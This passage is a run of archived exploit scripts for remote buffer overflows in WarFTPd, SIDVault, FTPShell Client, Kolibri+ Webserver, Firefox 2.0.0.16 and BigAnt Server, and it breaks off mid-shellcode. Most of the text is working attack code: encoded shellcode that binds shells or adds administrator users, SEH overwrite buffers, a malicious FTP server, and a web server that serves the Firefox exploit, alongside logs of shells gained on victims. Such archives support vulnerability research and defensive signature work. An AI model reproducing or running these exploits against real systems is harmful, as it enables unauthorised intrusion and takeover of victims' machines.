			if res.count('Microsoft Windows'):
				print "[+] Welcome my lord, i'm here to serve you ;) ...\n"
				from telnetlib import Telnet
				telnet = Telnet()
				telnet.sock = skt
				try:
					telnet.interact()
				except:
					pass
				skt.close()
				print "[-] Bye..bye I hope you've enjoyed your stay.. ;)"
				return None
		skt.close()
		print '[-] Explotation failed\nDaemon should be dead...'

if __name__ == '__main__':
	if len(sys.argv) != 3:
		print "*************************************"
		print "* Coded by Sergio 'shadown' Alvarez *"
		print "*          shadown@gmail.com        *"
		print "*************************************"
		print "Usage: %s host port" % sys.argv[0]
		sys.exit(1)

	exp = warftpd(sys.argv[1], int(sys.argv[2]))
	exp.setsctype('findskt')
	exp.setscport(1234)
	exp.setbsize(1014)
	exp.setebpaddr(0xdeadbeef) # sometimes needed, just in case
	exp.setretaddr('\x4c\xfa\x12\x00') # Universal Win2k SP0/SP1/SP2/SP3/SP4 (jmp to our input buffer)
	exp.exploit()

# milw0rm.com [2005-04-26]
#!/usr/bin/python
#
# $ ./sidvault.py 192.168.1.131
#
# [*] SIDVault 2.0e Windows Remote Buffer Overflow
# [*] Written by blake
# [*] Tested on Windows XP SP3
# [+] Sending payload
# [+] Check port 4444 for shell
#
# $ nc 192.168.1.131 4444
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\WINDOWS\system32>

import socket, sys, ldap

print "\n[*] SidVault 2.0e Windows Remote Buffer Overflow"
print "[*] Written by blake"
print "[*] Tested on Windows XP SP3"

if len(sys.argv)!=2:
	print "[*] Usage: %s <ip>" % sys.argv[0]
	sys.exit(0)

host = sys.argv[1]

# windows/shell_bind_tcp - 696 bytes Encoder: x86/alpha_mixed 
# EXITFUNC=seh, LPORT=4444

shellcode = (
"\x89\xe1\xd9\xe1\xd9\x71\xf4\x5d\x55\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x4b\x4c\x43\x5a\x4a\x4b\x50\x4d\x4d\x38\x4c\x39\x4b\x4f\x4b"
"\x4f\x4b\x4f\x45\x30\x4c\x4b\x42\x4c\x46\x44\x46\x44\x4c\x4b"
"\x47\x35\x47\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a"
"\x4f\x4c\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31"
"\x4a\x4b\x51\x59\x4c\x4b\x50\x34\x4c\x4b\x45\x51\x4a\x4e\x46"
"\x51\x49\x50\x4d\x49\x4e\x4c\x4c\x44\x49\x50\x42\x54\x43\x37"
"\x49\x51\x48\x4a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4b\x44\x47"
"\x4b\x50\x54\x46\x44\x51\x38\x43\x45\x4b\x55\x4c\x4b\x51\x4f"
"\x47\x54\x43\x31\x4a\x4b\x45\x36\x4c\x4b\x44\x4c\x50\x4b\x4c"
"\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x43\x33\x46\x4c\x4c\x4b"
"\x4c\x49\x42\x4c\x47\x54\x45\x4c\x43\x51\x48\x43\x46\x51\x49"
"\x4b\x42\x44\x4c\x4b\x50\x43\x50\x30\x4c\x4b\x47\x30\x44\x4c"
"\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x51\x50\x43\x38\x51"
"\x4e\x43\x58\x4c\x4e\x50\x4e\x44\x4e\x4a\x4c\x50\x50\x4b\x4f"
"\x49\x46\x42\x46\x46\x33\x43\x56\x42\x48\x47\x43\x47\x42\x42"
"\x48\x42\x57\x44\x33\x46\x52\x51\x4f\x46\x34\x4b\x4f\x4e\x30"
"\x42\x48\x48\x4b\x4a\x4d\x4b\x4c\x47\x4b\x50\x50\x4b\x4f\x48"
"\x56\x51\x4f\x4c\x49\x4b\x55\x42\x46\x4d\x51\x4a\x4d\x43\x38"
"\x45\x52\x50\x55\x43\x5a\x43\x32\x4b\x4f\x48\x50\x43\x58\x48"
"\x59\x44\x49\x4b\x45\x4e\x4d\x46\x37\x4b\x4f\x48\x56\x46\x33"
"\x51\x43\x51\x43\x50\x53\x46\x33\x50\x43\x50\x53\x51\x53\x50"
"\x53\x4b\x4f\x4e\x30\x45\x36\x42\x48\x42\x31\x51\x4c\x43\x56"
"\x46\x33\x4b\x39\x4d\x31\x4a\x35\x45\x38\x4e\x44\x45\x4a\x42"
"\x50\x49\x57\x51\x47\x4b\x4f\x49\x46\x43\x5a\x44\x50\x50\x51"
"\x46\x35\x4b\x4f\x4e\x30\x42\x48\x4e\x44\x4e\x4d\x46\x4e\x4d"
"\x39\x46\x37\x4b\x4f\x49\x46\x50\x53\x51\x45\x4b\x4f\x4e\x30"
"\x45\x38\x4a\x45\x51\x59\x4c\x46\x51\x59\x46\x37\x4b\x4f\x4e"
"\x36\x50\x50\x50\x54\x46\x34\x46\x35\x4b\x4f\x48\x50\x4d\x43"
"\x43\x58\x4a\x47\x42\x59\x48\x46\x44\x39\x50\x57\x4b\x4f\x4e"
"\x36\x46\x35\x4b\x4f\x48\x50\x43\x56\x42\x4a\x43\x54\x45\x36"
"\x43\x58\x45\x33\x42\x4d\x4c\x49\x4a\x45\x42\x4a\x46\x30\x50"
"\x59\x47\x59\x48\x4c\x4c\x49\x4a\x47\x42\x4a\x50\x44\x4c\x49"
"\x4a\x42\x46\x51\x49\x50\x4a\x53\x4e\x4a\x4b\x4e\x50\x42\x46"
"\x4d\x4b\x4e\x51\x52\x46\x4c\x4c\x53\x4c\x4d\x42\x5a\x46\x58"
"\x4e\x4b\x4e\x4b\x4e\x4b\x45\x38\x42\x52\x4b\x4e\x4e\x53\x44"
"\x56\x4b\x4f\x43\x45\x50\x44\x4b\x4f\x4e\x36\x51\x4b\x50\x57"
"\x50\x52\x50\x51\x46\x31\x50\x51\x42\x4a\x45\x51\x46\x31\x50"
"\x51\x46\x35\x46\x31\x4b\x4f\x48\x50\x45\x38\x4e\x4d\x4e\x39"
"\x43\x35\x48\x4e\x50\x53\x4b\x4f\x48\x56\x43\x5a\x4b\x4f\x4b"
"\x4f\x50\x37\x4b\x4f\x4e\x30\x4c\x4b\x50\x57\x4b\x4c\x4d\x53"
"\x49\x54\x42\x44\x4b\x4f\x4e\x36\x46\x32\x4b\x4f\x4e\x30\x43"
"\x58\x4a\x50\x4c\x4a\x45\x54\x51\x4f\x46\x33\x4b\x4f\x48\x56"
"\x4b\x4f\x4e\x30\x41\x41")

junk = "\x41" * 1024		# junk buffer
ret = "\x33\xbf\x96\x7c"	# jmp esp 7C96BF33 Shell32.dll XP SP3
nops = "\x90" * 10		# nop sled
sc = shellcode			# shellcode
junk2 = "\x42" * 2375		# 3071 - 696 = 2375 junk

print "[+] Sending payload"

l = ldap.open(host)
l.simple_bind("dc=" + junk + ret + nops + sc + junk2, "\x42" * 256)

print "[+] Check port 4444 for shell\n"

# milw0rm.com [2009-09-03]
#!/usr/bin/python

import socket, sys, ldap

print "[*] SidVault 2.0e Windows Universal Buffer Overflow Exploit (SEH)"
print "[*] Original author : blake"
print "[*] Seh Exploit : Skull-Hacker"
print "[*] Tested on Windows XP SP3"

if len(sys.argv)!=2:
	print "[*] Usage: %s <ip>" % sys.argv[0]
	sys.exit(0)


# win32_exec -  EXITFUNC=seh CMD=calc Size=343 Encoder=PexAlphaNum http://metasploit.com
shellcode=(
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x37\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x41"
"\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x51\x32\x42\x42\x32\x41"
"\x41\x30\x41\x41\x42\x58\x38\x42\x42\x50\x75\x4b\x59\x4b\x4c\x59"
"\x78\x52\x64\x63\x30\x65\x50\x53\x30\x4e\x6b\x57\x35\x77\x4c\x6c"
"\x4b\x61\x6c\x63\x35\x73\x48\x67\x71\x48\x6f\x6e\x6b\x50\x4f\x45"
"\x48\x6e\x6b\x53\x6f\x61\x30\x73\x31\x38\x6b\x53\x79\x4e\x6b\x66"
"\x54\x6e\x6b\x46\x61\x38\x6e\x30\x31\x6b\x70\x6e\x79\x6e\x4c\x4f"
"\x74\x79\x50\x74\x34\x44\x47\x4f\x31\x59\x5a\x76\x6d\x55\x51\x59"
"\x52\x68\x6b\x4a\x54\x35\x6b\x71\x44\x65\x74\x37\x74\x31\x65\x4a"
"\x45\x6e\x6b\x73\x6f\x44\x64\x55\x51\x4a\x4b\x50\x66\x4c\x4b\x44"
"\x4c\x30\x4b\x6e\x6b\x53\x6f\x37\x6c\x46\x61\x58\x6b\x6c\x4b\x77"
"\x6c\x6e\x6b\x46\x61\x5a\x4b\x4f\x79\x31\x4c\x47\x54\x37\x74\x6a"
"\x63\x74\x71\x59\x50\x70\x64\x6e\x6b\x51\x50\x50\x30\x6e\x65\x4b"
"\x70\x72\x58\x64\x4c\x6c\x4b\x71\x50\x56\x6c\x4e\x6b\x52\x50\x57"
"\x6c\x6c\x6d\x4c\x4b\x63\x58\x73\x38\x5a\x4b\x45\x59\x4e\x6b\x4f"
"\x70\x4c\x70\x35\x50\x43\x30\x63\x30\x4c\x4b\x53\x58\x77\x4c\x73"
"\x6f\x56\x51\x48\x76\x53\x50\x66\x36\x4f\x79\x39\x68\x6f\x73\x39"
"\x50\x61\x6b\x30\x50\x61\x78\x4a\x50\x6c\x4a\x73\x34\x33\x6f\x45"
"\x38\x6d\x48\x49\x6e\x6c\x4a\x46\x6e\x76\x37\x69\x6f\x48\x67\x45"
"\x33\x73\x51\x72\x4c\x71\x73\x63\x30\x41")


sploit =  "\x41"*1028
sploit += "SKH"	#Trick track  ;) 
sploit += shellcode
sploit += "\x44"*(3299-len(shellcode))
sploit += "\xE8\x18\xF3\xFF\xFF"
sploit += "\x44"*5
sploit += "\xEB\xF4\x90\x90"
sploit += "\x29\x10\x40"	#univ ret

print "[+] Sending payload"

l = ldap.open(sys.argv[1])
l.simple_bind("dc=" +sploit, "\x42" * 256)
print "[+] Done!\n"

# milw0rm.com [2009-09-09]
#!/usr/bin/python
# _  _   _         __    _     _ _  
#| || | (_)  ___  /  \  | |__ | | | 
#| __ | | | (_-< | () | | / / |_  _|
#|_||_| |_| /__/  \__/  |_\_\   |_| 
#
#[+] Bug :	 FTPShell Client 4.1 RC2 Remote Buffer Overflow Exploit (univ)
#[+] Author :	 His0k4
#[+] Tested on : xp_sp3,w2k_sp4
#[+] Greetz :	 All friends
#		 piece of "zlabiya"

#---exploit-log---
#attacker@dz-labs:~/pentests/fuzzers/ftp$ python FTPShell_client.py
#[+] Listening on [FTP] 21
#[+] Connection accepted from: 192.168.1.3
#[+] Sending the malicious pasv response...
#[+] Done, wait for trying to connect to port 4444 on the target...
#
#(UNKNOWN) [192.168.1.3] 4444 (?) open
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Documents and Settings\victim\Desktop>


from socket import *
import os
import time


# win32_bind -  EXITFUNC=seh LPORT=4444 Size=709 Encoder=PexAlphaNum http://metasploit.com
stage2 =(
"\x44\x7A\x32\x37\x44\x7A\x32\x37"
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x46\x4b\x4e"
"\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x56\x4b\x38"
"\x4e\x46\x46\x42\x46\x32\x4b\x48\x45\x34\x4e\x43\x4b\x58\x4e\x57"
"\x45\x30\x4a\x47\x41\x50\x4f\x4e\x4b\x58\x4f\x34\x4a\x31\x4b\x38"
"\x4f\x55\x42\x42\x41\x30\x4b\x4e\x49\x54\x4b\x38\x46\x53\x4b\x38"
"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c"
"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x43\x46\x35\x46\x32\x4a\x32\x45\x57\x45\x4e\x4b\x48"
"\x4f\x45\x46\x32\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x50\x4b\x44"
"\x4b\x58\x4f\x45\x4e\x41\x41\x50\x4b\x4e\x43\x30\x4e\x42\x4b\x38"
"\x49\x58\x4e\x56\x46\x52\x4e\x31\x41\x36\x43\x4c\x41\x53\x4b\x4d"
"\x46\x36\x4b\x38\x43\x34\x42\x53\x4b\x58\x42\x34\x4e\x30\x4b\x48"
"\x42\x37\x4e\x31\x4d\x4a\x4b\x38\x42\x44\x4a\x30\x50\x35\x4a\x36"
"\x50\x48\x50\x44\x50\x50\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x46"
"\x43\x55\x48\x46\x4a\x46\x43\x43\x44\x33\x4a\x56\x47\x57\x43\x57"
"\x44\x43\x4f\x55\x46\x55\x4f\x4f\x42\x4d\x4a\x56\x4b\x4c\x4d\x4e"
"\x4e\x4f\x4b\x53\x42\x35\x4f\x4f\x48\x4d\x4f\x45\x49\x48\x45\x4e"
"\x48\x46\x41\x58\x4d\x4e\x4a\x50\x44\x50\x45\x55\x4c\x56\x44\x30"
"\x4f\x4f\x42\x4d\x4a\x36\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x45"
"\x4f\x4f\x48\x4d\x43\x35\x43\x35\x43\x35\x43\x35\x43\x55\x43\x54"
"\x43\x55\x43\x54\x43\x35\x4f\x4f\x42\x4d\x48\x46\x4a\x36\x41\x51"
"\x4e\x55\x48\x46\x43\x55\x49\x38\x41\x4e\x45\x39\x4a\x36\x46\x4a"
"\x4c\x51\x42\x47\x47\x4c\x47\x35\x4f\x4f\x48\x4d\x4c\x36\x42\x51"
"\x41\x35\x45\x55\x4f\x4f\x42\x4d\x4a\x56\x46\x4a\x4d\x4a\x50\x52"
"\x49\x4e\x47\x35\x4f\x4f\x48\x4d\x43\x35\x45\x55\x4f\x4f\x42\x4d"
"\x4a\x36\x45\x4e\x49\x44\x48\x38\x49\x44\x47\x55\x4f\x4f\x48\x4d"
"\x42\x55\x46\x55\x46\x35\x45\x45\x4f\x4f\x42\x4d\x43\x49\x4a\x46"
"\x47\x4e\x49\x47\x48\x4c\x49\x37\x47\x35\x4f\x4f\x48\x4d\x45\x55"
"\x4f\x4f\x42\x4d\x48\x46\x4c\x36\x46\x36\x48\x46\x4a\x56\x43\x36"
"\x4d\x36\x49\x58\x45\x4e\x4c\x46\x42\x35\x49\x55\x49\x52\x4e\x4c"
"\x49\x58\x47\x4e\x4c\x46\x46\x44\x49\x58\x44\x4e\x41\x43\x42\x4c"
"\x43\x4f\x4c\x4a\x50\x4f\x44\x54\x4d\x42\x50\x4f\x44\x34\x4e\x32"
"\x43\x39\x4d\x48\x4c\x47\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x56"
"\x44\x47\x50\x4f\x43\x4b\x48\x31\x4f\x4f\x45\x57\x46\x54\x4f\x4f"
"\x48\x4d\x4b\x55\x47\x55\x44\x35\x41\x45\x41\x35\x41\x55\x4c\x46"
"\x41\x30\x41\x55\x41\x35\x45\x55\x41\x45\x4f\x4f\x42\x4d\x4a\x36"
"\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x46"
"\x4f\x4f\x4f\x4f\x47\x53\x4f\x4f\x42\x4d\x4b\x48\x47\x45\x4e\x4f"
"\x43\x48\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x35\x4f\x4f\x42\x4d"
"\x4a\x56\x42\x4f\x4c\x38\x46\x50\x4f\x55\x43\x55\x4f\x4f\x48\x4d"
"\x4f\x4f\x42\x4d\x5a")

stage1=(
#[*] Using Msf::Encoder::PexAlphaNum with final size of 141 bytes
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x48\x36\x41\x38\x4c\x4c"
"\x4f\x4f\x4f\x50\x44\x34\x44\x55\x4c\x46\x44\x50\x4a\x35\x4d\x4c"
"\x50\x52\x4e\x33\x45\x30\x4c\x35\x46\x37\x4f\x4e\x4a\x4b\x46\x54"
"\x4c\x47\x44\x43\x47\x33\x4b\x58\x4c\x4f\x4f\x4a\x45\x37\x4c\x4e"
"\x4f\x4a\x45\x57\x47\x4e\x4f\x4f\x47\x4e\x4c\x50\x5a")


buffer =  stage1 #<---------------------------------|
buffer += '\x41'*(412-len(stage1)) #		    |
buffer += '\xC5\xB3\x43\x00'	# add esp,8;retn----|


s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 21))
s.listen(1)
print "[+] Listening on [FTP] 21"
c, addr = s.accept()

print "[+] Connection accepted from: %s" % (addr[0])

c.send("220 Hey victim batet fik!\r\n")
c.recv(1024)
time.sleep(0.5)
c.send("331 User anonymous OK Password required\r\n")
c.recv(1024)
time.sleep(0.5)
c.send("230 Ok.\r\n")
c.recv(1024)

# Enable this when client performs CWD command
#time.sleep(1)
#c.send("250 CWD command successful.\r\n")
#c.recv(1024)

time.sleep(0.5)
c.send("257 \x22/\x22 is current directory\r\n")
c.recv(1024)
time.sleep(0.5)
c.send("200 Type set to A.\r\n")
c.recv(1024)
time.sleep(0.5)
print "[+] Sending the malicious pasv response..."
c.send("227 "+stage2+"\r\n"
"227 Entering Passive Mode ("+buffer+").\r\n"
"\r\n")
time.sleep(2)
c.close()
s.close()
print("[+] Done, wait for trying to connect to the target on port 4444...\n")
time.sleep(25)
os.system("nc -nv "+addr[0]+" 4444")

# milw0rm.com [2009-09-09]
#!/usr/bin/python
#
# Could not get this to work on XP SP3. php5ts.dll is the only module with safe seh off but could not get the pop pop ret
# to work correctly despite the large number of usable addresses that were tested.
#
# $ ./kolibri.py 192.168.1.146 8080
#
# [*] Kolibri+ Webserver 2 SEH Overwrite
# [*] Written by blake
# [*] Tested on Windows XP SP 1
# [*] Denial of Service found by Usman Saeed
#
# [+] Connecting to 192.168.1.146 on port 8080
# [+] Sending payload
# [+] Done. User jenny created with the password of pass on 192.168.1.146

import socket, sys

print "\n[*] Kolibri+ Webserver 2 SEH Overwrite"
print "[*] Written by blake"
print "[*] Tested on Windows XP SP 1"
print "[*] Denial of Service found by Usman Saeed\n"

if len(sys.argv)!= 3:
	print "[*] Usage: %s <ip> <port>"
	sys.exit(0)

host = sys.argv[1]
port = int(sys.argv[2])

# windows/adduser - 446 bytes Encoder: x86/alpha_mixed
# USER=jenny, EXITFUNC=seh, PASS=pass

shellcode = (
"\x89\xe6\xdb\xc8\xd9\x76\xf4\x5f\x57\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x4b\x4c\x4b\x58\x47\x34\x45\x50\x43\x30\x43\x30\x4c\x4b\x50"
"\x45\x47\x4c\x4c\x4b\x43\x4c\x43\x35\x42\x58\x43\x31\x4a\x4f"
"\x4c\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x51\x30\x43\x31\x4a"
"\x4b\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x45\x51\x4a\x4e\x50\x31"
"\x49\x50\x4c\x59\x4e\x4c\x4b\x34\x49\x50\x44\x34\x45\x57\x49"
"\x51\x48\x4a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4b\x44\x47\x4b"
"\x51\x44\x51\x34\x45\x54\x43\x45\x4a\x45\x4c\x4b\x51\x4f\x46"
"\x44\x45\x51\x4a\x4b\x43\x56\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b"
"\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c\x4b\x45\x4c\x4c\x4b\x45"
"\x51\x4a\x4b\x4b\x39\x51\x4c\x47\x54\x45\x54\x49\x53\x51\x4f"
"\x50\x31\x4a\x56\x43\x50\x50\x56\x45\x34\x4c\x4b\x50\x46\x50"
"\x30\x4c\x4b\x51\x50\x44\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d"
"\x4c\x4b\x43\x58\x45\x58\x4d\x59\x4a\x58\x4c\x43\x49\x50\x42"
"\x4a\x50\x50\x45\x38\x4c\x30\x4c\x4a\x44\x44\x51\x4f\x43\x58"
"\x4a\x38\x4b\x4e\x4c\x4a\x44\x4e\x46\x37\x4b\x4f\x4a\x47\x42"
"\x43\x42\x4d\x43\x54\x46\x4e\x43\x55\x43\x48\x43\x55\x51\x30"
"\x46\x4f\x42\x43\x51\x30\x42\x4e\x42\x45\x44\x34\x47\x50\x44"
"\x35\x42\x53\x45\x35\x43\x42\x51\x30\x43\x5a\x43\x55\x42\x4e"
"\x42\x4e\x43\x49\x47\x50\x42\x50\x43\x51\x43\x43\x43\x43\x51"
"\x30\x46\x4f\x51\x51\x51\x54\x51\x54\x51\x30\x51\x36\x47\x56"
"\x47\x50\x42\x4e\x45\x35\x44\x34\x47\x50\x42\x4c\x42\x4f\x43"
"\x53\x43\x51\x42\x4c\x43\x57\x42\x52\x42\x4f\x42\x55\x44\x30"
"\x51\x30\x51\x51\x45\x34\x42\x4d\x42\x49\x42\x4e\x45\x39\x44"
"\x33\x44\x34\x43\x42\x43\x51\x44\x34\x42\x4f\x42\x52\x43\x43"
"\x47\x50\x43\x5a\x45\x35\x42\x4e\x42\x4e\x43\x49\x51\x30\x46"
"\x4f\x47\x31\x51\x54\x47\x34\x43\x30\x41\x41")

payload = "\x41" * 8			# junk buffer
payload += "\x90" * 10			# nop sled
sc = shellcode				# 446 bytes of shellcode
jump_near = "\xe9\x34\xfe\xff\xff"	# jump near -460 bytes
next_seh = "\xeb\xf9\xff\xff"		# short jump back -7 bytes
seh = "\x6f\x2a\xe6\x77"		# p/p/r from kernel32.dll
junk = "\x41" * 424			# junk buffer

print "[+] Connecting to %s on port %d" % (host,port)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((host,port))
	print "[+] Sending payload"
	s.send("GET /index.html" + payload + sc + jump_near + next_seh + seh + junk + " HTTP/1.0\r\n\r\n")
	s.close()
	print "[+] Done. User jenny created with the password of pass on %s\n" % host
except:
	print "[x] Could not connect!"

# milw0rm.com [2009-09-11]
#!/usr/bin/python
# FireFox 2.0.0.16 Windows XP SP3 x86 Remote Exploit
# Author: Dominic Chell <dmc@deadbeef.co.uk>
#
# Exploits the UTF-8 URL overflow vulnerability described in CVE-2008-0016.
# As of September 2009 there are no public exploits for this vulnerability.
# However, according to securityfocus an exploit is available in both Canvas
# and Core Impact.
#
# Thanks to meta and ChrisA

from BaseHTTPServer import HTTPServer 
from BaseHTTPServer import BaseHTTPRequestHandler 
import sys 

# Adduser shellcode encoded with shikata_ga_nai
# USER=r00t PASS=r00tr00t!!
egg = (
	"\xda\xd4\x29\xc9\xb8\xb3\xfe\x8b\x54\xd9\x74\x24\xf4\xb1\x32"
	"\x5f\x83\xef\xfc\x31\x47\x14\x03\x47\xa7\x1c\x7e\xa8\x2f\xa4"
	"\x81\x51\xaf\xae\xc7\x6d\x24\xcc\xc2\xf5\x3b\xc2\x46\x4a\x23"
	"\x97\x06\x75\x52\x4c\xf1\xfe\x60\x19\x03\xef\xb9\xdd\x9d\x43"
	"\x3d\x1d\xe9\x9c\xfc\x54\x1f\xa2\x3c\x83\xd4\x9f\x94\x70\x11"
	"\x95\xf1\xf2\x46\x71\xf8\xef\x1f\xf2\xf6\xa4\x54\x5b\x1a\x3a"
	"\x80\xef\x3e\xb7\x57\x1b\xb7\x9b\x73\xdf\x04\x7c\x4d\x29\xea"
	"\xd5\xc9\x5e\xac\xe9\x9a\x21\x3c\x81\xed\xbd\x91\x1e\x65\xb6"
	"\x60\xd8\xf5\x06\x18\x49\x92\x76\x56\x6d\x3d\x1f\xfe\x90\x4b"
	"\xd1\xa9\x93\xab\x8d\x38\x08\x1a\x37\xba\xb5\x42\x98\x59\x16"
	"\xed\x83\xe9\x76\x84\x38\x74\x05\x46\xcd\x46\xd9\xf2\x11\xd4"
	"\x29\xcb\x25\x6a\x7a\x1b\xb2\xab\x5b\x7b\x15\xea\xdf\x3f\x49"
	"\xca\xf9\x9f\xe7\x77\x72\xc0\x9b\x18\x19\x61\x08\x81\xaf\x0e"
	"\xa5\x3d\x70\x90\x21\xd0\x19\x7c\xc3\x59\xae\xf2\x72\xe9\x21"
	"\x81\x07\x31\xcc\x55\xd8\x45\x10\xb9\x59\xe1\x14\xc5\x53")

# Egghunter where egg is 0x41424142.
# The egghunter is encoded as HTML entities, this evades the unicode conversion.
# Egghunter courtesy of skape. Modified to xor edx,edx as first instruction.
shellcode = (
	"&#xD233;&#x9090;&#x9090;&#x4290;&#x6a52;&#x5802;&#x2ecd;"
	"&#x053c;&#x745a;&#xb8ef;&#x4142;&#x4142;&#xfa8b;&#x75af;"
	"&#xafea;&#xe775;&#xe7ff;&#xcccc;&#xcccc;&#xcccc;&#xcccc;"
	"&#xcccc;&#xcccc;&#xcccc;&#xcccc;")

# The UTF-8 character in the URL triggers the code path where the overflow occurs.
s = "\xC3\xBA"
u = unicode(s, "utf-8")
utf8chars = u.encode( "utf-8" )

class myRequestHandler(BaseHTTPRequestHandler):

	def create_exploit_buffer(self):
		html = "<meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\" />\n<html>\n<body>\n"

		# Store the egg and adduser shellcode in CDATA
		# The egghunter will try and find this in memory
		html += "<!CDATA[" + "\x42\x41\x42\x41\x42\x41\x42\x41" + egg
		html += "]>\n"

		html += "<a href=\""
		html += "\x01"
		html += "xx://dmc"
		html += utf8chars
		html += "/"
		
		html += "&#x9090;" * 1700	# Windows XP SP3 SEH offset
		html += "&#4331;&#37008;"	# unicode - ptr to next seh "\xeb\x10\x90\x90";
		html += "&#x11e7;&#x6037;"	# 0x603711e7 - pop/pop/ret - xpcom_core.dll
		html +="&#x9090;" * 10
		html += shellcode # add egghunter
		html +="&#x9090;" * 10
		html += "\" >s</a>"
		html += "\n</body>"
		html += "\n</html>"
	
		return html

	def do_GET(self):
		self.printCustomHTTPResponse(200)
		if self.path == "/":
			target=self.client_address[0]
			html = self.create_exploit_buffer()
			self.wfile.write(html)
			print "[*] Evil payload sent\n[*] Wait a few minutes and try connecting with r00t/r00tr00t!!\n"
			
	def printCustomHTTPResponse(self, respcode):
		self.send_response(respcode)
		self.send_header("Content-type", "text/html")
		self.send_header("Server", "myRequestHandler")
		self.end_headers()

print "FireFox 2.0.0.16 x86 Exploit\nAuthor: dmc@deadbeef.co.uk\n"
print "[*] Starting evil web server"
print "[*] Waiting for clients\n"

httpd = HTTPServer(('', 80), myRequestHandler)

try:
	httpd.handle_request()
	httpd.serve_forever() 
except KeyboardInterrupt:
	print "\n\n[*] Interupt caught, exiting.\n\n"
	sys.exit(1)

# milw0rm.com [2009-09-14]
#!/usr/bin/python
# BigAnt Server version 2.50 SEH Overwrite - 0day
# Written and discovered by Blake
# Tested on Windows XP SP3
# 
# $ ./bigant.py 192.168.1.131 6660
#
# [*] BigAnt Server v2.50 SEH Overwrite 0day
# [*] Written and discovered by Blake
# [*] Tested on Windows XP SP3
#
# [+] Connecting to 192.168.1.131 on port 6660
# [+] Sending payload
# [+] Connect to bind shell on port 4444
#
# $ nc 192.168.1.131 4444
# Microsoft Windows XP [Version 5.1.2600]
# (C) Copyright 1985-2001 Microsoft Corp.
#
# C:\WINDOWS\system32>

import socket, sys

if len(sys.argv)!= 3:
	print "\n[*] Usage: %s <ip> <port>\n" % sys.argv[0]
	sys.exit(0)

host = sys.argv[1]
port = int(sys.argv[2]) 	# port 6660 by default

# windows/shell_bind_tcp - 696 bytes  Encoder: x86/alpha_mixed
# EXITFUNC=seh, LPORT=4444, RHOST=
shellcode = (
"\x89\xe2\xdb\xcc\xd9\x72\xf4\x5f\x57\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x4b\x4c\x42\x4a\x4a\x4b\x50\x4d\x4b\x58\x4b\x49\x4b\x4f\x4b"
"\x4f\x4b\x4f\x43\x50\x4c\x4b\x42\x4c\x51\x34\x46\x44\x4c\x4b"
"\x50\x45\x47\x4c\x4c\x4b\x43\x4c\x43\x35\x44\x38\x43\x31\x4a"
